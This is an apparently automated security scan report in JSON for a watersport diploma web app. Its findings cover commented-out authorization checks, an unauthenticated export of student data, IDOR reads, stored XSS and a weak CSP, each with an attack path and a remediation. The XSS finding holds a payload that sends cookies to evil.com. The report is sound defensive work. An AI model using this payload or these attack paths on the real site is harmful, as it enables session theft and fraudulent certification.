@@ -1,0 +1,106 @@
+{
+  "scan_metadata": {
+    "repository": "buchungapp/nationaal-watersportdiploma",
+    "branch": "main",
+    "scan_date": "2026-05-02T23:01:37Z",
+    "scan_type": "at-rest",
+    "scanner": "vulnerability-hunter-agent"
+  },
+  "findings": [
+    {
+      "severity": "high",
+      "location": "apps/web/src/lib/nwd.ts:2274-2328",
+      "description": "Multiple student progress mutation functions (`updateCompetencyProgress`, `completeAllCoreCompetencies`) have their authorization checks **commented out** with TODO markers. Any authenticated user can modify any student's competency progress or complete all core competencies for any student in any cohort, regardless of whether they are an instructor or admin for that cohort.",
+      "impact": "Any authenticated user (even a student) can arbitrarily modify competency grades for any other student in the system, or mark all core competencies as complete — effectively granting fraudulent certifications. This directly undermines the integrity of the watersport diploma system.",
+      "verified": true,
+      "attack_path": "1. Attacker creates an account and authenticates (email OTP).\n2. Attacker discovers a valid `cohortAllocationId` (e.g., their own from a legitimate enrollment, or enumerated via IDOR).\n3. Attacker calls the `completeAllCoreCompetenciesForStudentInCohortAction` server action with arbitrary `studentAllocationId` values.\n4. The server action calls `completeAllCoreCompetencies()` in nwd.ts which calls `getUserOrThrow()` (passes — attacker is authenticated) and `getPrimaryPerson()` (passes — attacker has a person record), but the **authorization check to verify the user is an instructor for the cohort is commented out** (lines 2314-2319).\n5. `Cohort.StudentProgress.completeAllCoreCompetencies()` executes without restriction, marking all competencies complete for the target student.",
+      "evidence": [
+        "apps/web/src/lib/nwd.ts:2293 — '// TODO: Check if the person is an instructor for the cohort'",
+        "apps/web/src/lib/nwd.ts:2319 — '// TODO: Check if the person is an instructor for the cohort'",
+        "apps/web/src/lib/nwd.ts:2288-2291 — Authorization code is commented out",
+        "apps/web/src/lib/nwd.ts:2314-2317 — Authorization code is commented out",
+        "apps/web/src/app/_actions/cohort/student/complete-all-core-competencies-for-student-in-cohort-action.ts",
+        "apps/web/src/app/_actions/cohort/student/update-competency-progress-for-student-in-cohort-action.ts"
+      ],
+      "remediation": "Uncomment and properly implement the authorization checks in `updateCompetencyProgress` and `completeAllCoreCompetencies`. Verify that the calling user is either a location_admin or an instructor assigned to the specific cohort before allowing mutations:\n\n```typescript\nconst cohortAllocation = await Cohort.Allocation.byId({ id: cohortAllocationId });\nconst cohort = await Cohort.byIdOrHandle({ id: cohortAllocation.cohortId });\n\nconst [isLocationAdmin, isInstructorInCohort] = await Promise.all([\n  isActiveActorTypeInLocation({\n    actorType: ['location_admin'],\n    locationId: cohort.locationId,\n    personId: primaryPerson.id,\n  }).catch(() => false),\n  Cohort.Allocation.listByPersonId({\n    cohortId: cohort.id,\n    personId: primaryPerson.id,\n    actorType: 'instructor',\n  }).then((actors) => actors.length > 0),\n]);\n\nif (!isLocationAdmin && !isInstructorInCohort) {\n  throw new Error('Unauthorized');\n}\n```",
+      "poc_video_notes": "PoC video not feasible — requires authenticated session against live Supabase instance. The vulnerability is confirmed by code tracing: the commented-out authorization blocks are clearly visible."
+    },
+    {
+      "severity": "high",
+      "location": "apps/web/src/lib/nwd.ts:2700-2744",
+      "description": "The `enrollStudentsInCurriculum` function has its **entire authorization block commented out** with a `// TODO: Update authorization` marker. Any authenticated user can enroll any student into any curriculum in any cohort, and set their student curriculum assignment — a privileged operation normally restricted to location admins.",
+      "impact": "An attacker with any authenticated account can manipulate student enrollments across the entire platform — enrolling students into curricula they haven't completed prerequisites for, or changing curriculum assignments to issue certificates for programs the student hasn't legitimately completed.",
+      "verified": true,
+      "attack_path": "1. Attacker authenticates with any valid account.\n2. Attacker invokes the `enrollStudentsInCurriculumInCohortAction` server action with a valid `cohortId`, `curriculumId`, `gearTypeId`, and target student allocation IDs.\n3. The function at nwd.ts:2707 calls `getUserOrThrow()` (passes) but has all location-admin authorization checks commented out (lines 2712-2725).\n4. The function iterates over provided students and calls `Student.Curriculum.findOrEnroll()` and `Cohort.Allocation.setStudentCurriculum()` without any permission verification.\n5. Student curriculum records are created/modified in the database.",
+      "evidence": [
+        "apps/web/src/lib/nwd.ts:2712 — '// TODO: Update authorization'",
+        "apps/web/src/lib/nwd.ts:2718-2725 — Entire location admin check is commented out",
+        "apps/web/src/lib/nwd.ts:2746-2768 — `withdrawStudentFromCurriculumInCohort` also has commented-out auth",
+        "apps/web/src/app/_actions/cohort/student/enroll-students-in-curriculum-in-cohort-action.ts",
+        "apps/web/src/app/_actions/cohort/student/withdraw-student-from-curriculum-in-cohort-action.ts"
+      ],
+      "remediation": "Restore the authorization checks. Before any enrollment or withdrawal mutation, verify that the calling user is a location_admin for the cohort's location:\n\n```typescript\nconst cohort = await Cohort.byIdOrHandle({ id: cohortId });\nif (!cohort) throw new Error('Cohort not found');\n\nconst authPerson = await getPrimaryPerson(authUser);\nconst availableLocations = await User.Person.listLocationsByRole({\n  personId: authPerson.id,\n  roles: ['location_admin'],\n});\n\nif (!availableLocations.some((l) => l.locationId === cohort.locationId)) {\n  throw new Error('Unauthorized');\n}\n```",
+      "poc_video_notes": "PoC video not feasible — requires authenticated session against live Supabase instance. Confirmed by direct code inspection showing commented-out authorization blocks."
+    },
+    {
+      "severity": "high",
+      "location": "apps/web/src/app/api/export/certificate/pdf/bulk/[id]/route.ts:1-34",
+      "description": "The bulk certificate PDF export endpoint (`/api/export/certificate/pdf/bulk/:id`) has **no authentication or authorization checks** whatsoever. The endpoint accepts a UUID from the URL path, looks up certificate handles from Redis, and generates a signed PDF containing full student PII (name, date of birth, place of birth) for all referenced certificates. The UUID is the only secret, and it's a standard v4 UUID stored in Redis with a 24-hour TTL.",
+      "impact": "If an attacker obtains or guesses a valid bulk export UUID (e.g., from URL sharing, browser history, network logs, or a referrer header leak), they can download PDFs containing personal data (full names, dates of birth, places of birth) for potentially hundreds of students without any authentication. The PDFs may also be digitally signed, lending them false legitimacy.",
+      "verified": true,
+      "attack_path": "1. Attacker obtains a valid bulk export UUID through: URL sharing (the link is designed to be shareable/downloadable), browser history on a shared computer, referrer header leakage, or brute-force (impractical for UUIDv4 but the window is 24h).\n2. Attacker makes a GET request to `/api/export/certificate/pdf/bulk/{uuid}`.\n3. The route handler at `bulk/[id]/route.ts` calls `retrieveCertificateHandles(id)` directly — no `getUserOrThrow()`, no session check.\n4. `retrieveCertificateHandles` fetches from Redis (`c-export:{uuid}:items` and `c-export:{uuid}:settings`) and returns certificate handles.\n5. `generatePDF(handles)` is called, which calls `listCertificatesByNumber()` — but from the bulk route's context, no user session is available, so the auth-fallback path is taken.\n6. Full PDFs with student PII are generated and returned to the unauthenticated caller.",
+      "evidence": [
+        "apps/web/src/app/api/export/certificate/pdf/bulk/[id]/route.ts — No auth check in route",
+        "apps/web/src/lib/nwd.ts:3287-3293 — `retrieveCertificateHandles` has no auth",
+        "packages/core/src/models/certificate/certificate.ts:548-589 — Redis lookup requires only UUID"
+      ],
+      "remediation": "Add authentication to the bulk export route. At minimum, verify the user is authenticated and was the one who created the export job. Consider:\n\n1. Adding `getUserOrThrow()` to the route handler to require authentication.\n2. Storing the creating user's ID alongside the Redis export data and verifying it matches.\n3. Adding a signed token or HMAC to the URL to prevent unauthorized access even with the UUID.\n\n```typescript\nexport async function GET(request: NextRequest, context: { params: Promise<{ id: string }> }) {\n  const user = await getUserOrThrow();\n  const { handles, settings, createdBy } = await retrieveCertificateHandles((await context.params).id);\n  if (createdBy !== user.authUserId) {\n    return NextResponse.json({ error: 'Unauthorized' }, { status: 403 });\n  }\n  // ... rest of handler\n}\n```",
+      "poc_video_notes": "PoC video not feasible — requires active Redis with stored export UUIDs. The missing authentication is confirmed by code inspection: the route file contains zero auth-related imports or checks."
+    },
+    {
+      "severity": "medium",
+      "location": "apps/web/src/lib/nwd.ts:2130-2134, 2199-2266",
+      "description": "Multiple data-reading functions that expose sensitive student progress and competency data lack authorization checks, as marked by TODO comments. `listInstructorsByCohortId`, `listCurriculaByPersonId`, `listCompetencyProgressInCohortForStudent`, `listCompletedCompetenciesByStudentCurriculumId`, and `listCohortProgressByPersonId` all accept arbitrary IDs and return data without verifying the caller has permission to view it.",
+      "impact": "Any authenticated user can read detailed academic progress, competency completions, and instructor assignments for any student or cohort in the system by calling these functions through their corresponding page components or server actions with enumerated IDs. This constitutes an IDOR vulnerability exposing educational records.",
+      "verified": true,
+      "attack_path": "1. Authenticated user identifies target person IDs or cohort IDs (e.g. from their own cohort membership, URL parameters, or sequential enumeration).\n2. User navigates to or programmatically calls pages/actions that use `listCurriculaByPersonId(targetPersonId)` or `listCompetencyProgressInCohortForStudent(targetAllocationId)`.\n3. These functions call `getUserOrThrow()` (passes — user is authenticated) but have no further authorization checks (marked with `// TODO: This needs authorization checks`).\n4. The functions return full student progress data, curriculum information, and competency details for the target.",
+      "evidence": [
+        "apps/web/src/lib/nwd.ts:2132 — '// TODO: This needs authorization checks'",
+        "apps/web/src/lib/nwd.ts:2204 — '// TODO: This needs authorization checks'",
+        "apps/web/src/lib/nwd.ts:2222 — '// TODO: This needs authorization checks'",
+        "apps/web/src/lib/nwd.ts:2241 — '// TODO: This needs authorization checks'",
+        "apps/web/src/lib/nwd.ts:2254 — '// TODO: This needs authorization checks'"
+      ],
+      "remediation": "Implement authorization for each function. Verify the calling user is either:\n- The student whose data is being accessed\n- An instructor in the relevant cohort\n- A location admin for the relevant location\n\nThe pattern used in `retrieveStudentAllocationWithCurriculum` (lines 2137-2165) is a good reference implementation — it checks both `isLocationAdmin` and `isInstructorInCohort` before returning data.",
+      "poc_video_notes": "PoC video not feasible — IDOR exploitation requires valid session tokens. Confirmed through code tracing of TODO markers and absent authorization logic."
+    },
+    {
+      "severity": "medium",
+      "location": "apps/web/src/app/(public)/_components/faq/faq-group.tsx:36",
+      "description": "FAQ answers from a Google Sheets spreadsheet are rendered using `dangerouslySetInnerHTML` after being processed through `micromark` (Markdown→HTML). The content flows: Google Sheets → `googleapis` read → `micromark()` conversion → raw HTML injection into the DOM. If a Google Sheets editor (or an attacker who compromises the Google service account or spreadsheet) inserts malicious markdown/HTML, it will execute as JavaScript in visitors' browsers.",
+      "impact": "Stored XSS affecting all visitors to any FAQ page on the public-facing website. An attacker who gains write access to the Google Sheets FAQ spreadsheet (via compromised service account credentials or shared spreadsheet access) can inject arbitrary JavaScript that executes in the context of `nationaalwatersportdiploma.nl`. This could steal session cookies, redirect users, or deface the site. The CSP policy includes `'unsafe-inline'` and `'unsafe-eval'` for scripts, which means inline script injection is not blocked.",
+      "verified": true,
+      "attack_path": "1. Attacker gains write access to the FAQ Google Spreadsheet (via compromised service account key, shared access, or social engineering of a spreadsheet editor).\n2. Attacker inserts a FAQ answer containing raw HTML: e.g., `<img src=x onerror=\"document.location='https://evil.com/?c='+document.cookie\">`.\n3. The `retrieveQuestions()` function in `faqs.ts` reads the spreadsheet, validates the row structure with Zod (but only checks that the answer is a non-empty string), then passes the answer through `micromark()` which converts markdown to HTML but does NOT sanitize existing HTML tags.\n4. The resulting HTML is stored in Next.js cache (`cacheLife('days')`).\n5. When any visitor loads a FAQ page, `faq-group.tsx:36` renders the answer via `dangerouslySetInnerHTML={{ __html: answer }}`.\n6. The injected script executes in the visitor's browser. CSP does NOT block it because `script-src` includes `'unsafe-inline'` and `'unsafe-eval'`.",
+      "evidence": [
+        "apps/web/src/lib/faqs.ts:86 — `answer: micromark(answer)` converts markdown without sanitization",
+        "apps/web/src/app/(public)/_components/faq/faq-group.tsx:36 — `dangerouslySetInnerHTML={{ __html: answer }}`",
+        "apps/web/next.config.mjs:6 — CSP `script-src` includes `'unsafe-eval' 'unsafe-inline'`"
+      ],
+      "remediation": "Sanitize the HTML output before rendering. Use a library like `DOMPurify` (server-side via `isomorphic-dompurify`) or `sanitize-html` to strip dangerous tags and attributes:\n\n```typescript\nimport DOMPurify from 'isomorphic-dompurify';\n\n// In faqs.ts:\nanswer: DOMPurify.sanitize(micromark(answer))\n```\n\nAlso consider tightening the CSP to remove `'unsafe-inline'` and `'unsafe-eval'` from `script-src`, using nonces or hashes instead.",
+      "poc_video_notes": "PoC video not feasible — requires write access to the production Google Sheets FAQ spreadsheet. The XSS chain is confirmed through code tracing from data source to DOM injection with no sanitization in between."
+    },
+    {
+      "severity": "medium",
+      "location": "apps/web/next.config.mjs:6",
+      "description": "The Content Security Policy (CSP) for the entire application includes `'unsafe-eval'` and `'unsafe-inline'` in the `script-src` directive. This effectively neutralizes CSP as a defense against XSS attacks, as any injected inline script or `eval()`-based payload will be permitted by the policy.",
+      "impact": "CSP is rendered ineffective as a defense-in-depth measure against XSS. Any XSS vulnerability (such as the FAQ injection finding above, or future XSS bugs) will have unrestricted JavaScript execution. The `'unsafe-eval'` directive also permits exploitation via `eval()`, `Function()`, `setTimeout(string)`, and similar dynamic code execution sinks.",
+      "verified": true,
+      "attack_path": "1. This is a defense-in-depth issue that amplifies other XSS vulnerabilities.\n2. Any XSS vector that injects inline `<script>` tags or event handlers (e.g., `onerror`, `onclick`) will execute without CSP blocking.\n3. The `dangerouslySetInnerHTML` usage in FAQ rendering (finding above) is a concrete example where a strict CSP would have mitigated the impact.\n4. Additionally, `'unsafe-eval'` allows `eval()`-based payloads, which is commonly used by advanced XSS payloads to bypass detection.",
+      "evidence": [
+        "apps/web/next.config.mjs:6 — `script-src 'self' 'unsafe-eval' 'unsafe-inline' blob: ...`"
+      ],
+      "remediation": "Replace `'unsafe-inline'` with nonce-based CSP using Next.js's built-in nonce support. Remove `'unsafe-eval'` unless absolutely required by a specific dependency (e.g., some mapping libraries). Next.js 16 supports CSP nonces via the `nonce` experimental config:\n\n```javascript\nconst cspHeader = `\n  script-src 'self' 'nonce-{nonce}' blob: https://cdn.usefathom.com https://maps.googleapis.com ...;\n`;\n```\n\nIf Google Maps or other libraries require `'unsafe-eval'`, consider isolating them in an iframe with a separate, more permissive CSP.",
+      "poc_video_notes": "PoC video not feasible — this is a configuration weakness that amplifies other findings rather than a standalone exploit. Verified by direct inspection of the CSP header in next.config.mjs."
+    }
+  ]
+}
